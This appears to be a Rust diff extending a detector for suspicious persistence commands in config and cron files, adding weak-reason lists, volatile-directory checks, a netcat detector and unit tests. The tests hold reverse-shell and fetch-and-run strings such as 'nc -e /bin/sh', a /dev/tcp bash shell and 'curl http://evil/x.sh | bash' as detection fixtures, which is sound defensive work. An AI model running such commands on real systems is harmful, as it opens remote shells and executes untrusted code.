@@ -117,6 +117,60 @@ pub fn suspicious_matches(text: &str) -> Vec<&'static str> {
     reasons
 }
 
+/// Reasons that are common in legitimate config and so are never, on their
+/// own, enough to auto-remove anything. A stock certbot cron runs `perl -e`,
+/// health checks `curl`, backup jobs live in `/home`. A hit made only of these
+/// is reported for review; removal needs at least one reason not listed here.
+pub const WEAK_REASONS: &[&str] = &[
+    "base64 decoding (obfuscation)",
+    "inline interpreter payload",
+    "makes a file immutable",
+    "world-writable permission (dropper staging)",
+    "detaches from the controlling terminal",
+    "fetches remote content",
+    "schedules a one-shot job immediately (at job persistence)",
+    "pipes command into at scheduler",
+    "enables a service at boot (persistence installation)",
+    // module-specific extras
+    "nohup background",
+    "chmod +x",
+    "background execution detached from terminal",
+    "make-executable (stage two of a dropper)",
+    "execution from a home directory",
+];
+
+/// True when `reason` is strong enough to justify automatic removal.
+pub fn is_strong_reason(reason: &str) -> bool {
+    !WEAK_REASONS.contains(&reason)
+}
+
+/// True when any of `reasons` is strong (see [`WEAK_REASONS`]).
+pub fn has_strong_reason<S: AsRef<str>>(reasons: &[S]) -> bool {
+    reasons.iter().any(|r| is_strong_reason(r.as_ref()))
+}
+
+/// Volatile, world-writable directories nothing legitimate executes from.
+pub const VOLATILE_EXEC_DIRS: &[&str] = &["/tmp/", "/var/tmp/", "/dev/shm/", "/run/shm/"];
+
+/// True when `text` references a [`VOLATILE_EXEC_DIRS`] path.
+pub fn references_volatile_dir(text: &str) -> bool {
+    VOLATILE_EXEC_DIRS.iter().any(|dir| text.contains(dir))
+}
+
+/// True when `text` runs netcat (`nc`, `ncat`, `netcat`) as a command, as
+/// opposed to merely containing the letters "nc -" (`rsync -a`, `sync -f`).
+pub fn invokes_netcat(text: &str) -> bool {
+    text.split(|c: char| c.is_whitespace() || matches!(c, ';' | '|' | '&' | '(' | ')' | '`'))
+        .map(|tok| tok.trim_matches(|c| c == '\'' || c == '"'))
+        .map(|tok| tok.rsplit('/').next().unwrap_or(tok))
+        .any(|cmd| {
+            matches!(
+                cmd,
+                "nc" | "ncat" | "netcat" | "nc.traditional" | "nc.openbsd"
+            )
+        })
+}
+
 /// Whether `text` references an executable under a world-writable directory.
 ///
 /// # Examples
@@ -179,6 +233,32 @@ pub fn read_text_file(path: &Path) -> Option<String> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn netcat_detection_needs_the_command_not_a_substring() {
+        assert!(invokes_netcat("nc -e /bin/sh 1.2.3.4 9"));
+        assert!(invokes_netcat("x; /usr/bin/ncat 1.2.3.4 9"));
+        assert!(invokes_netcat("mkfifo f; cat f|nc -l 4444"));
+        assert!(!invokes_netcat("rsync -a /srv /backup"));
+        assert!(!invokes_netcat("sync -f /"));
+        assert!(!invokes_netcat("/usr/bin/rpcinfo"));
+    }
+
+    #[test]
+    fn weak_reasons_alone_are_not_strong() {
+        assert!(!has_strong_reason(&suspicious_matches(
+            "perl -e 'sleep int(rand(43200))' && certbot -q renew"
+        )));
+        assert!(!has_strong_reason(&suspicious_matches(
+            "*/5 * * * * curl -fsS https://hc.example/ping"
+        )));
+        assert!(has_strong_reason(&suspicious_matches(
+            "curl http://evil/x.sh | bash"
+        )));
+        assert!(has_strong_reason(&suspicious_matches(
+            "bash -i >& /dev/tcp/1.2.3.4/9 0>&1"
+        )));
+    }
 
     #[test]
     fn clean_text_matches_nothing() {
